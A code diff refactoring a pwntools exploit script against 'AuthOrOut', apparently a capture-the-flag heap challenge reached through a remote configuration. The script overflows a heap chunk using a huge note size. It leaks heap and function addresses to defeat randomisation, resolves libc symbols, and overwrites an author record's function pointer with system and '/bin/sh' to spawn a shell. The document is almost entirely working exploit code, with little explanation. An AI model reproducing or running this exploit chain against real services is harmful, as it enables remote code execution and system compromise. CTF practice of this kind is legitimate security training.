@@ -21,6 +21,50 @@ class AuthOrOutPwn(PwnTarget):
     def input_handler(cls, proc: process, payload: bytes, *args, **kwargs):
         proc.recvline()
 
+    @classmethod
+    def create_author(cls, name: bytes, surname: bytes, age: int, note_size: int, data: bytes):
+        cls.logger.info(t.process.clean(0.3).decode())
+        t.process.sendline(b'1')
+        t.process.recvline()
+        cls.logger.info(t.process.clean(0.2).decode(), name)
+        t.process.sendline(name)
+        cls.logger.info(t.process.clean(0.2).decode(), surname)
+        t.process.sendline(surname)
+        cls.logger.info(t.process.clean(0.2).decode(), age)
+        t.process.sendline(str(age).encode())
+        cls.logger.info(t.process.clean(0.2).decode(), note_size)
+        t.process.sendline(str(note_size).encode())
+        cls.logger.info(t.process.clean(0.2).decode(), data)
+        t.process.sendline(data)
+        result = t.process.recvline()
+        return result.decode().split()[1]
+
+    @classmethod
+    def delete_author(cls, author_id: str):
+        cls.logger.info(t.process.clean(0.3).decode())
+        t.process.sendline(b"4")
+        cls.logger.info(t.process.clean(0.2).decode(), author_id)
+        t.process.sendline(author_id.encode())
+        cls.logger.info(t.process.clean(0.2).decode())
+
+    @classmethod
+    def print_author(cls, author_id: str) -> dict:
+        cls.logger.info(t.process.clean(0.3).decode())
+        t.process.sendline(b"3")
+        cls.logger.info(t.process.clean(0.2).decode(), author_id)
+        t.process.sendline(author_id.encode())
+        t.process.recvline()
+        t.process.recvline()
+        t.process.recvline()
+        author = {
+            "name": t.process.recvline().split(b' ', maxsplit=1)[1],
+            "surname": t.process.recvline().split(b' ', maxsplit=1)[1],
+            "age": t.process.recvline(),
+            "note": t.process.recvline(),
+        }
+        t.process.clean()
+        return author
+
 
 @dataclasses.dataclass
 class Author:
@@ -40,49 +84,6 @@ class Author:
         )
 
 
-def create_author(name: bytes, surname: bytes, age: int, note_size: int, data: bytes):
-    print(t.process.clean(0.3).decode())
-    t.process.sendline(b'1')
-    t.process.recvline()
-    print(t.process.clean(0.2).decode(), name)
-    t.process.sendline(name)
-    print(t.process.clean(0.2).decode(), surname)
-    t.process.sendline(surname)
-    print(t.process.clean(0.2).decode(), age)
-    t.process.sendline(str(age).encode())
-    print(t.process.clean(0.2).decode(), note_size)
-    t.process.sendline(str(note_size).encode())
-    print(t.process.clean(0.2).decode(), data)
-    t.process.sendline(data)
-    result = t.process.recvline()
-    return result.decode().split()[1]
-
-
-def delete_author(author_id: str):
-    print(t.process.clean(0.3).decode())
-    t.process.sendline(b"4")
-    print(t.process.clean(0.2).decode(), author_id)
-    t.process.sendline(author_id.encode())
-    print(t.process.clean(0.2).decode())
-
-
-def print_author(author_id: str) -> dict:
-    print(t.process.clean(0.3).decode())
-    t.process.sendline(b"3")
-    print(t.process.clean(0.2).decode(), author_id)
-    t.process.sendline(author_id.encode())
-    t.process.recvline()
-    t.process.recvline()
-    t.process.recvline()
-    author = {
-        "name": t.process.recvline().split(b' ', maxsplit=1)[1],
-        "surname": t.process.recvline().split(b' ', maxsplit=1)[1],
-        "age": t.process.recvline(),
-        "note": t.process.recvline(),
-    }
-    t.process.clean()
-    return author
-
 
 if __name__ == '__main__':
     remote_config = Config(
@@ -98,21 +99,21 @@ if __name__ == '__main__':
     )
     heap_overflow_size = 18446744073709551609
     t = TargetBase(pwn_target=AuthOrOutPwn, config=remote_config)
-    id1 = create_author(b'test', b'lololol', 123, 8, data=b'AAAAAAAA')
-    id2 = create_author(b'test12', b'lolol', 12, 8, data=b'/bin/sh')
-    delete_author(id1)
+    id1 = t.pwn_target.create_author(b'test', b'lololol', 123, 8, data=b'AAAAAAAA')
+    id2 = t.pwn_target.create_author(b'test12', b'lolol', 12, 8, data=b'/bin/sh')
+    t.pwn_target.delete_author(id1)
     payload_frame = Author(name=b'X' * 16, surname=b'X' * 16)
-    id1 = create_author(b'test12', b'lolol', 12, heap_overflow_size, data=b'Q' * 16 + payload_frame.deserialize()[:0x20])
-    author2 = print_author(id2)
+    id1 = t.pwn_target.create_author(b'test12', b'lolol', 12, heap_overflow_size, data=b'Q' * 16 + payload_frame.deserialize()[:0x20])
+    author2 = t.pwn_target.print_author(id2)
     buffer_address_raw = author2['surname'][16:-1]
     buffer_address = u64(buffer_address_raw.ljust(8, b'\0'))
     logger.success(f"Heap buffer@{hex(buffer_address)}")
 
-    delete_author(id1)
+    t.pwn_target.delete_author(id1)
     payload_frame = Author(note_address=buffer_address-8)
-    id1 = create_author(b'test12', b'lolol', 12, heap_overflow_size,
+    id1 = t.pwn_target.create_author(b'test12', b'lolol', 12, heap_overflow_size,
                         data=b'Q' * 16 + payload_frame.deserialize()[:0x28])
-    author2 = print_author(id2)
+    author2 = t.pwn_target.print_author(id2)
     print_note_address = u64(author2['note'].split(b' ', maxsplit=1)[1][1:-2].ljust(8, b'\0'))
     logger.success(f"PrintNote@{hex(print_note_address)}")
     base = print_note_address - t.file.symbols['PrintNote']
@@ -132,11 +133,11 @@ if __name__ == '__main__':
 
     addresses = []
 
-    delete_author(id1)
+    t.pwn_target.delete_author(id1)
     payload_frame = Author(note_address=target_function_address, print_ptr=print_function_address)
-    id1 = create_author(b'test12', b'lolol', 12, heap_overflow_size,
+    id1 = t.pwn_target.create_author(b'test12', b'lolol', 12, heap_overflow_size,
                         data=b'Q' * 16 + payload_frame.deserialize())
-    author2 = print_author(id2)
+    author2 = t.pwn_target.print_author(id2)
     address = u64(author2['note'][:-1].ljust(8, b'\0'))
     logger.success(f"{target_function_name}@{hex(address)}")
     addresses.append((target_function_name, address))
@@ -147,11 +148,11 @@ if __name__ == '__main__':
         exit(0)
     target_function_name, target_function_address = result
 
-    delete_author(id1)
+    t.pwn_target.delete_author(id1)
     payload_frame = Author(note_address=target_function_address, print_ptr=print_function_address)
-    id1 = create_author(b'test12', b'lolol', 12, heap_overflow_size,
+    id1 = t.pwn_target.create_author(b'test12', b'lolol', 12, heap_overflow_size,
                         data=b'Q' * 16 + payload_frame.deserialize())
-    author2 = print_author(id2)
+    author2 = t.pwn_target.print_author(id2)
     address = u64(author2['note'][:-1].ljust(8, b'\0'))
     logger.success(f"{target_function_name}@{hex(address)}")
     addresses.append((target_function_name, address))
@@ -163,9 +164,9 @@ if __name__ == '__main__':
     if bin_sh_ptr is None:
         logger.critical(f"Failed to find /bin/sh in libc")
         exit(0)
-    delete_author(id1)
+    t.pwn_target.delete_author(id1)
     payload_frame = Author(note_address=bin_sh_ptr, print_ptr=system_ptr)
-    id1 = create_author(b'test12', b'lolol', 12, heap_overflow_size,
+    id1 = t.pwn_target.create_author(b'test12', b'lolol', 12, heap_overflow_size,
                         data=b'Q' * 16 + payload_frame.deserialize())
     print(t.process.clean(0.3).decode())
     t.process.sendline(b"3")
